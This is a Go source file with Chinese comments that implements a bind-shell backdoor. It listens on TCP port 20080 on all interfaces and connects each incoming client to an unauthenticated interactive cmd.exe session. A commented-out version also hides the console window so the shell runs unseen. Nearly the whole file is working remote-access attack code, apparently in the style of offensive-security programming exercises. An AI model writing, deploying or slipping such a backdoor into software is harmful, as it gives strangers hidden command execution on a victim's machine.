package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

type Flusher struct {
	w *bufio.Writer
}

//NewFlusher 从io.Writer 创建一个新的Flusher
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		//它返回底层的Writer
		w: bufio.NewWriter(w),
	}
}

//写入数据并显示刷新缓冲区
func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

//func handler(conn net.Conn) {
//	//显示调用/bin/sh 并使用-i进入交互模式
//	//这样我们就可以用它作为标准输入和标准输出
//	cmd := exec.Command("cmd.exe")
//	//将标准输入设置为我们的连接
//	cmd.Stdin = conn
//	//从连接创建一个Flusher用于标准输出
//	//这样可以确保标准输出被充分刷新并通过net.Conn发送
//	cmd.Stdout = NewFlusher(conn)
//	//运行命令
//	//Windows平台上，执行系统命令隐藏cmd窗口
//	// go build -ldflags -H=windowsgui
//	//运行时隐藏golang程序自己的cmd窗口
//	if runtime.GOOS == "windows" {
//		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
//	}
//	err := cmd.Run()
//	//err := cmd.Run()
//	if err != nil {
//		log.Fatalln(err)
//	}
//}
func handler(coon net.Conn) {
	//显示调用/bin/sh 并使用-i进入交互模式
	//这样我们就可以用它作为标准输入和标准输出
	cmd := exec.Command("cmd.exe")
	//io.Pipe()是Go同步内存管道
	rp, wp := io.Pipe()
	//发送到客户端上的任何数据:Stdin
	//监听器上接收的任何数据：Stout
	cmd.Stdin = coon
	cmd.Stdout = wp
	//命令的任何标准输出都将发送道Writer
	//然后通过管道传送到reader并通过TCP连接输出
	go io.Copy(coon, rp)
	cmd.Run()
	coon.Close()

}
func main() {
	//在所有接口上绑定TCP端口20080
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}
	log.Println("Listening on 0.0.0.0:20080")
	for {
		//等待连接。在已建立的连接上创建net.Conn
		conn, err := listener.Accept()
		log.Println("Received connection")
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}
		//处理连接。使用goroutine实现并发
		go handler(conn)
	}
}
